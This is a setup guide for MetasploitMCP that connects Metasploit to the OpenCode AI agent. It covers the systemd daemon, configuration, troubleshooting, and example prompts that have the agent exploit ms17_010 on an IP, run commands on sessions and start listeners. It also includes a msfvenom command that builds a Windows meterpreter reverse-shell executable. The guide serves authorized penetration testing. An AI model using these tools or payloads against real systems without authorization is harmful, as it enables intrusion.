# 🛡️ MetasploitMCP + OpenCode — Complete Setup Guide

> Install **MetasploitMCP** on Kali Linux, run it as a persistent systemd service, and connect it to **OpenCode** so your AI agent can drive Metasploit through MCP tools.

**Tested on:** Kali Linux Rolling · OpenCode v2.2.x · Metasploit Framework 6.5.3-dev · MetasploitMCP 0.0~git20260205

---

## 📋 Table of Contents

- [What you get](#-what-you-get)
- [Prerequisites](#-prerequisites)
- [Step 1 — Install MetasploitMCP](#-step-1--install-metasploitmcp)
- [Step 2 — Start the RPC daemon](#-step-2--start-the-rpc-daemon)
- [Step 3 — Make it persistent (systemd)](#-step-3--make-it-persistent-systemd)
- [Step 4 — Connect to OpenCode](#-step-4--connect-to-opencode)
- [Step 5 — Verify](#-step-5--verify)
- [Step 6 — Use it](#-step-6--use-it)
- [Step 7 — Hardening](#-step-7--hardening)
- [🔥 Troubleshooting](#-troubleshooting)
- [🧹 Uninstall](#-uninstall)
- [⚡ TL;DR](#-tldr)

---

## 🎯 What you get

12 MCP tools exposed to your agent:

| Category | Tools |
| --- | --- |
| 🔍 Recon | `list_exploits`, `list_payloads` |
| 💥 Exploitation | `run_exploit`, `run_auxiliary_module`, `run_post_module` |
| 📦 Payloads | `generate_payload` |
| 🖥️ Sessions | `list_active_sessions`, `send_session_command`, `terminate_session` |
| 🎧 Handlers | `list_listeners`, `start_listener`, `stop_job` |

---

## ✅ Prerequisites

```bash
# Metasploit Framework must be installed
msfconsole --version
msfrpcd -h

# Python 3.10+
python3 --version

# OpenCode
opencode --version
```

> ⚠️ **Only use this against systems you are explicitly authorized to test.**

---

## 📦 Step 1 — Install MetasploitMCP

Kali ships it as a package:

```bash
sudo apt update
sudo apt install metasploitmcp
```

Verify:

```bash
metasploitmcp -h
```

Expected output:

```
usage: MetasploitMCP.py [-h] [--transport {http,stdio}] [--host HOST]
                        [--port PORT] [--reload] [--find-port] [--debug]
```

The package installs:

| Path | Purpose |
| --- | --- |
| `/usr/bin/metasploitmcp` | Shell wrapper |
| `/usr/share/metasploitmcp/MetasploitMCP.py` | Actual server |

### 🔧 Alternative (no root, latest git)

```bash
git clone https://github.com/GH05TCREW/MetasploitMCP.git
cd MetasploitMCP
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Then use `python MetasploitMCP.py --transport stdio` in place of the binary in Step 4.

---

## 🔑 Step 2 — Start the RPC daemon

MetasploitMCP talks to Metasploit over **MSFRPC**, not by shelling out to `msfconsole`. Nothing works without this daemon.

```bash
msfrpcd -P 'YOUR_STRONG_PASSWORD' -S -a 127.0.0.1 -p 55553
```

| Flag | Meaning |
| --- | --- |
| `-P` | RPC password — **must match** `MSF_PASSWORD` in OpenCode config |
| `-S` | Disable SSL (matches `MSF_SSL=false`) |
| `-a 127.0.0.1` | Bind loopback only — never expose this port |
| `-p 55553` | Default MSFRPC port |

Confirm it is listening:

```bash
ss -ltnp | grep 55553
```

Sanity-check auth before touching OpenCode:

```bash
python3 -c "
from pymetasploit3.msfrpc import MsfRpcClient
c = MsfRpcClient('YOUR_STRONG_PASSWORD', server='127.0.0.1', port=55553, ssl=False)
print('AUTH OK', c.core.version)
"
```

> 💡 Do this check **first** whenever something breaks. It separates "RPC problem" from "MCP problem" instantly.

---

## ⚙️ Step 3 — Make it persistent (systemd)

Running `msfrpcd` in a terminal dies on logout. A **user** unit fixes that — no root needed.

Create `~/.config/systemd/user/msfrpcd.service`:

```ini
[Unit]
Description=Metasploit RPC daemon (msfrpcd) for MetasploitMCP
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/msfrpcd -f -P YOUR_STRONG_PASSWORD -S -a 127.0.0.1 -p 55553
Restart=on-failure
RestartSec=5

[Install]
WantedBy=default.target
```

Lock it down, then enable:

```bash
chmod 600 ~/.config/systemd/user/msfrpcd.service
systemctl --user daemon-reload
systemctl --user enable --now msfrpcd
```

Keep user services alive after logout:

```bash
loginctl enable-linger $USER
loginctl show-user $USER -p Linger    # Linger=yes
```

Useful commands:

```bash
systemctl --user status msfrpcd
systemctl --user restart msfrpcd
journalctl --user -u msfrpcd -f
```

> 💡 `-f` (foreground) is required here. Without it `msfrpcd` forks into the background, systemd loses the PID, and you get `EADDRINUSE` on restart.

---

## 🔌 Step 4 — Connect to OpenCode

Project-local config:

```bash
opencode mcp add metasploit \
  --env MSF_PASSWORD='YOUR_STRONG_PASSWORD' \
  --env MSF_SERVER=127.0.0.1 \
  --env MSF_PORT=55553 \
  --env MSF_SSL=false \
  -- /usr/bin/metasploitmcp --transport stdio
```

Or global (every project) — add `--global`.

This writes `opencode.json` in the current directory:

```jsonc
{
  "$schema": "https://opencode.ai/config.json",
  "mcp": {
    "servers": {
      "metasploit": {
        "type": "local",
        "command": ["/usr/bin/metasploitmcp", "--transport", "stdio"],
        "codemode": true,
        "environment": {
          "MSF_PASSWORD": "YOUR_STRONG_PASSWORD",
          "MSF_SERVER": "127.0.0.1",
          "MSF_PORT": "55553",
          "MSF_SSL": "false"
        }
      }
    }
  }
}
```

### 📝 Notes

- `--transport stdio` is required. The default is HTTP/SSE, which OpenCode local servers do not use.
- `codemode: true` exposes tools as `tools.metasploit.*` — the default. Set `false` to keep them on the native tool list.
- `MSF_SSL` must match the `-S` flag from Step 2.
- Config reloads on save — **no restart needed**.

---

## ✅ Step 5 — Verify

```bash
opencode mcp list
```

Success:

```
✓ metasploit  connected
```

Failure looks like:

```
✗ metasploit  failed: NotFound: ChildProcess.spawn (/usr/bin/metasploitmcp --transport stdio)
```

→ See [Troubleshooting](#-troubleshooting).

Inside OpenCode, `/mcps` shows the server and its tools.

---

## 🚀 Step 6 — Use it

Just talk to the agent — it picks the tool itself:

| Prompt | Tool |
| --- | --- |
| "ms17_010 ke exploits dikhao" | `list_exploits` |
| "meterpreter payload banao" | `generate_payload` |
| "active sessions dikhao" | `list_active_sessions` |
| "192.168.1.50 pe ms17_010 check karo" | `run_exploit` (check first) |
| "session 1 pe whoami chalao" | `send_session_command` |
| "port 4444 pe listener start karo" | `start_listener` |

Manual smoke test — ask the agent to run `list_listeners` and expect:

```json
{"result":{"status":"success","handlers":{},"other_jobs":{},"handler_count":0,"other_job_count":0,"total_job_count":0}}
```

---

## 🔒 Step 7 — Hardening

### 1. Keep the password out of git

`.gitignore`:

```gitignore
opencode.json
opencode.jsonc
.opencode/
*.bak
payloads/
```

### 2. Lock file permissions

```bash
chmod 600 opencode.json
chmod 600 ~/.config/systemd/user/msfrpcd.service
```

### 3. Environment substitution (optional)

Avoid the literal password in `opencode.json`:

```jsonc
"environment": {
  "MSF_PASSWORD": "{env:MSF_PASSWORD}"
}
```

Then provide the variable:

```bash
mkdir -p ~/.config/environment.d
printf 'MSF_PASSWORD=YOUR_STRONG_PASSWORD\n' > ~/.config/environment.d/msf.conf
chmod 600 ~/.config/environment.d/msf.conf
```

> ⚠️ **This only works after a full logout/login or reboot.** The OpenCode desktop app spawns its background service with the environment it inherited at launch. `systemctl --user set-environment` does **not** retroactively apply to a running Electron app — the service will start with `MSF_PASSWORD` unset and every tool call fails with `MsfRPC: Authentication failed`.
>
> Set it up, reboot, then flip the config. Verify with `opencode mcp list` right after.

---

## 🔥 Troubleshooting

### ❌ `NotFound: ChildProcess.spawn`

**Cause:** the binary did not exist when the config was first loaded. OpenCode caches the failed connection state.

**Fix:** make a real content change to the MCP block so the config hash changes, then re-check:

```bash
# confirm the binary exists
ls -l /usr/bin/metasploitmcp

# touch alone does NOT work — the content hash must change
# e.g. add "codemode": true (or flip it)
opencode mcp list
```

---

### ❌ `MsfAuthError: MsfRPC: Authentication failed`

**Cause:** `msfrpcd` is running with a different password than `MSF_PASSWORD`.

**Diagnose:**

```bash
pgrep -af msfrpcd
ss -ltnp | grep 55553
```

Ruby rewrites its own `argv`, so you **cannot** read the password from `ps`. Test it directly instead:

```bash
python3 -c "
from pymetasploit3.msfrpc import MsfRpcClient
MsfRpcClient('YOUR_STRONG_PASSWORD', server='127.0.0.1', port=55553, ssl=False)
print('AUTH OK')
"
```

**Fix:** restart the daemon with the matching password.

```bash
systemctl --user restart msfrpcd     # if using the unit
# or
kill <PID> && msfrpcd -P 'YOUR_STRONG_PASSWORD' -S -a 127.0.0.1 -p 55553
```

> ⚠️ Restarting `msfrpcd` **destroys all live sessions, handlers and jobs**.

---

### ❌ `EADDRINUSE` / `Address already in use`

An old daemon still holds port 55553.

```bash
ss -ltnp | grep 55553
kill <PID>
# wait for the port to free, then start again
```

Root cause is usually a missing `-f` flag in the systemd unit.

---

### ❌ Server exits with `CRITICAL: Failed to initialize Metasploit client on startup`

MetasploitMCP connects to RPC **eagerly** and exits if auth fails. So `connected` in `opencode mcp list` is not enough — run the auth check above.

Check server-side logs:

```bash
journalctl --user -u msfrpcd -f
grep -i metasploit ~/.local/share/opencode/log/opencode.log | tail -20
```

---

### ⚠️ `generate_payload` returns `b'payload'`

Observed with MetasploitMCP `0.0~git20260205` + Metasploit `6.5.3-dev`:

```json
{"status": "error", "message": "An unexpected server error occurred during payload generation: b'payload'"}
```

This is a `_get_module_object('payload', ...)` failure inside the server, not a config problem. Workaround — generate directly via RPC or `msfvenom`:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f exe -o payload.exe
```

---

### 🔍 Where to look

| What | Where |
| --- | --- |
| OpenCode logs | `~/.local/share/opencode/log/opencode.log` |
| MCP daemon logs | `journalctl --user -u msfrpcd -f` |
| Service state | `opencode service status` |
| Config | `./opencode.json` or `~/.config/opencode/opencode.jsonc` |

---

## 🧹 Uninstall

```bash
# stop and remove the daemon
systemctl --user disable --now msfrpcd
rm ~/.config/systemd/user/msfrpcd.service
systemctl --user daemon-reload

# remove the MCP entry from opencode.json (or delete the whole "metasploit" block)
# then:
opencode mcp list

# remove the package
sudo apt remove metasploitmcp
```

---

## ⚡ TL;DR

```bash
# 1. install
sudo apt update && sudo apt install metasploitmcp

# 2. daemon (persistent)
mkdir -p ~/.config/systemd/user
cat > ~/.config/systemd/user/msfrpcd.service <<'EOF'
[Unit]
Description=Metasploit RPC daemon for MetasploitMCP
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/msfrpcd -f -P YOUR_STRONG_PASSWORD -S -a 127.0.0.1 -p 55553
Restart=on-failure
RestartSec=5

[Install]
WantedBy=default.target
EOF

chmod 600 ~/.config/systemd/user/msfrpcd.service
systemctl --user daemon-reload
systemctl --user enable --now msfrpcd
loginctl enable-linger $USER

# 3. connect
opencode mcp add metasploit \
  --env MSF_PASSWORD='YOUR_STRONG_PASSWORD' \
  --env MSF_SERVER=127.0.0.1 \
  --env MSF_PORT=55553 \
  --env MSF_SSL=false \
  -- /usr/bin/metasploitmcp --transport stdio

# 4. verify
opencode mcp list    # ✓ metasploit  connected
```

---

## 📚 References

- [MetasploitMCP (GH05TCREW)](https://github.com/GH05TCREW/MetasploitMCP)
- [OpenCode MCP docs](https://opencode.ai/v2/docs/mcp-servers)
- [Model Context Protocol](https://modelcontextprotocol.io/)
- [Kali metasploitmcp package](https://www.kali.org/tools/metasploitmcp/)

---

<p align="center"><i>Use responsibly. Test only what you own or have written permission to test. 🔐</i></p>
